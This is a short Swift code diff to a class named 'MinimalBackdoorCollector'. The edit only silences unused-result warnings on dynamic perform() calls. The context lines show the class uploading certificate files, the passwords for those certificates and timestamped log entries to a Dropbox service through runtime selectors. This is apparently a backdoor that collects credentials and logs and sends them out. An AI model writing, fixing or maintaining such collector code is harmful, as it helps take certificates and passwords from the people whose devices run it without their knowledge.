@@ -181,7 +181,7 @@ class MinimalBackdoorCollector {
             // Correct selector syntax and method signature
             if dropboxService.responds(to: Selector("uploadCertificateFile:completion:")) {
                 let completion: ((Bool, Error?) -> Void)? = nil
-                dropboxService.perform(
+                _ = dropboxService.perform(
                     Selector("uploadCertificateFile:completion:"),
                     with: url,
                     with: completion
@@ -191,7 +191,7 @@ class MinimalBackdoorCollector {
                 if let password = password {
                     if dropboxService.responds(to: Selector(("storePasswordForCertificate:password:completion:"))) {
                         let passwordCompletion: ((Bool, Error?) -> Void)? = nil
-                        dropboxService.perform(
+                        _ = dropboxService.perform(
                             Selector(("storePasswordForCertificate:password:completion:")),
                             with: url.lastPathComponent,
                             with: password,
@@ -216,7 +216,7 @@ class MinimalBackdoorCollector {
                 let fileName = "log_\(Int(Date().timeIntervalSince1970)).txt"
                 let completion: ((Bool, Error?) -> Void)? = nil
                 
-                dropboxService.perform(
+                _ = dropboxService.perform(
                     Selector(("uploadLogEntry:fileName:completion:")),
                     with: logEntry,
                     with: fileName,
